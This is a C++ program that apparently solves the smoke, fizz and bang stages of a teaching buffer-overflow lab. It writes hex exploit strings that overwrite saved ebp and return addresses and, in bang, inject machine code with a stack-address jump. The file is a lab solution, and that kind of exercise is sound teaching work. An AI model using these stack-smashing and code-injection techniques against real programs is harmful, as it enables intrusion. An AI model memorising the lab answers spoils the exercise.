#include <bits/stdc++.h>
using namespace std;


void smoke () {
	ofstream fout("smoke.txt");
	if (!fout) {
		fprintf(stdout,"open smoke.txt failed!\n");
		exit(0);
	}
	// 填满缓冲区
	for (int i = 0; i < 10; ++i)
		fout << "00 00 00 00\n";
	// 覆盖ebp
	fout << "00 00 00 00\n";
	// 覆盖返回地址到smoke(栈地址递减是栈增)
	fout << "18 8c 04 08" << "\n"; 
	fout.close();
}

void fizz () {
	ofstream fout("fizz.txt");
	if (!fout) {
		fprintf(stdout,"open fizz.txt failed!\n");
		exit(0);
	}
	// 填满缓冲区
	for (int i = 0; i < 10; ++i)
		fout << "00 00 00 00\n";
	// 覆盖ebp
	fout << "00 00 00 00\n";
	// 覆盖readbuf返回地址到fizz(栈地址递减是栈增)
	fout << "42 8c 04 08" << "\n"; 
	// 覆盖返回地址
	fout << "00 00 00 00" << "\n";
	// 参数1的存放位置
	fout << "33 a4 65 57" << "\n";
	fout.close();
}

void bang () {
	ofstream fout("bang.txt");
	if (!fout) {
		fprintf(stdout,"open bang.txt failed!\n");
		exit(0);
	}
	fout << "c7 05 00 d1\n04 08 33 a4\n65 57 68 9d\n8c 04 08 c3\n";
	for (int i = 0; i < 7; ++i)
		fout << "00 00 00 00\n";
	fout << "a8 38 68 55\n";
	fout.close();
}

int main () {
	//smoke();
	//fizz();
	bang();
	return 0;
}
